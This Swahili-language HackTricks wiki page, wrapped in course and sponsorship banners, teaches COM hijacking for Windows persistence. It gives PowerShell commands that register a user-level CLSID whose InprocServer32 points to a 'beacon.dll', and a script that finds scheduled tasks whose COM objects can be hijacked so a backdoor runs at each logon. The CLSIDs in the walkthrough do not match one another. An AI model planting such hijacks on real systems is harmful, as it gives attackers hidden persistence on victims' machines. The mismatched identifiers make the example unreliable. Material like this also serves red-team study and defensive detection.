# COM Hijacking

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

### Kutafuta vipengele vya COM visivyokuwepo

Kwa kuwa thamani za HKCU zinaweza kubadilishwa na watumiaji, **COM Hijacking** inaweza kutumika kama **njia ya kudumu**. Kwa kutumia `procmon`, ni rahisi kupata usajili wa COM uliotafutwa ambao haupo ambao mshambuliaji anaweza kuunda ili kudumu. Vichujio:

* Operesheni za **RegOpenKey**.
* ambapo _Matokeo_ ni **JINA HALIJAPATIKANA**.
* na _Njia_ inamalizika na **InprocServer32**.

Baada ya kuamua ni COM ipi isiyokuwepo ya kuiga, tekeleza amri zifuatazo. _Jihadhari ikiwa utaamua kuiga COM ambayo inapakia kila sekunde chache kwani hiyo inaweza kuwa ni mzigo mkubwa._&#x20;
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Vipengele vya COM vya Task Scheduler vinavyoweza kutekwa

Kazi za Windows hutumia Vichocheo Maalum kuwaita vitu vya COM na kwa sababu zinaendeshwa kupitia Task Scheduler, ni rahisi kutabiri wakati zitakapofanyika.

```powershell
# Onyesha COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
    if ($Task.Actions.ClassId -ne $null)
    {
        if ($Task.Triggers.Enabled -eq $true)
        {
            $usersSid = "S-1-5-32-545"
            $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

            if ($Task.Principal.GroupId -eq $usersGroup)
            {
                Write-Host "Task Name: " $Task.TaskName
                Write-Host "Task Path: " $Task.TaskPath
                Write-Host "CLSID: " $Task.Actions.ClassId
                Write-Host
            }
        }
    }
}

# Matokeo ya mfano:
# Task Name:  Example
# Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [zaidi kama hii ya awali...]
```

Kwa kuangalia matokeo, unaweza kuchagua moja ambayo itatekelezwa **kila wakati mtumiaji anapoingia** kwa mfano.

Sasa tafuta CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** katika **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** na katika HKLM na HKCU, kawaida utagundua kuwa thamani haipo katika HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Kisha, unaweza tu kuunda kuingia kwa HKCU na kila wakati mtumiaji anapoingia, mlango wako wa nyuma utafanya kazi.

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
